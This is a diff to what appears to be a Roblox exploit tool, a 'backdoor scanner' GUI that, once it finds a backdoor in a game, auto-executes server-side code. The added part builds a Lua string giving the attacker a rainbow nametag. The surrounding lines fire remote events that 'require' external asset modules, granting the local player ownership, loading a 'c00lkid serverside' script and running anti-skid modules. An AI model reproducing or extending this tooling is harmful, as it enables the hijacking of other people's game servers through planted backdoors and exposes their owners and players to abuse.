@@ -2514,18 +2514,90 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				Duration = 4
 			})
                      -- Auto executes
+			local whayter = [[local Players = game:GetService("Players")
+
+local allowedNames = {
+    "' .. game.Players.LocalPlayer.Name .. '"
+}
+
+local function hsvToRgb(h, s, v)
+    local r, g, b
+    local i = math.floor(h * 6)
+    local f = h * 6 - i
+    local p = v * (1 - s)
+    local q = v * (1 - f * s)
+    local t = v * (1 - (1 - f) * s)
+    i = i % 6
+    if i == 0 then r, g, b = v, t, p
+    elseif i == 1 then r, g, b = q, v, p
+    elseif i == 2 then r, g, b = p, v, t
+    elseif i == 3 then r, g, b = p, q, v
+    elseif i == 4 then r, g, b = t, p, v
+    elseif i == 5 then r, g, b = v, p, q end
+    return Color3.fromRGB(r * 255, g * 255, b * 255)
+end
+
+local function createHackerUI(char, player)
+    local head = char:WaitForChild("Head", 5)
+    if not head or head:FindFirstChild("RIG6_GUI") then return end
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "RIG6_GUI"
+    billboard.Size = UDim2.new(0, 200, 0, 100)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Adornee = head
+    billboard.Parent = head
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 60)
+    label.Position = UDim2.new(0, 0, 1, -40)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Arcade
+    label.TextScaled = true
+    label.Text = "Special " .. player.Name
+    label.Parent = billboard
+
+    coroutine.wrap(function()
+        local hue = 0
+        while label and label.Parent do
+            hue = (hue + 0.01) % 1
+            label.TextColor3 = hsvToRgb(hue, 1, 1)
+            wait(0.1)
+        end
+    end)()
+end
+
+local function handlePlayer(player)
+    for _, allowedName in ipairs(allowedNames) do
+        if player.Name == allowedName then
+            if player.Character then
+                createHackerUI(player.Character, player)
+            end
+            player.CharacterAdded:Connect(function(char)
+                createHackerUI(char, player)
+            end)
+        end
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    handlePlayer(player)
+end
+
+Players.PlayerAdded:Connect(handlePlayer)]]
                         fireRemoteEvent('require(92684888032460)({Owners = {"' .. game.Players.LocalPlayer.Name .. '"}})')
                         wait(0.5)
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
                         fireRemoteEvent('require(7276744247):noskids("' .. game.Players.LocalPlayer.Name ..  '")')
-                        fireRemoteEvent('require(3986243232).load("No good sir this is c00okid serverside",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+                        fireRemoteEvent('require(3986243232).load("No good sir this is c00lkid serverside",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 		else
 			script.Parent.Framee.Check.Text = "backdoor not found!"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
 			wait(3)
 			script.Parent.Framee.scan.Visible = true
 			script.Parent.Framee.Check.Visible = false
-			script.Parent.Framee.Check.Text = "Injecting..."
+			script.Parent.Framee.Check.Text = ""
 		end
 	
 		scanning = false
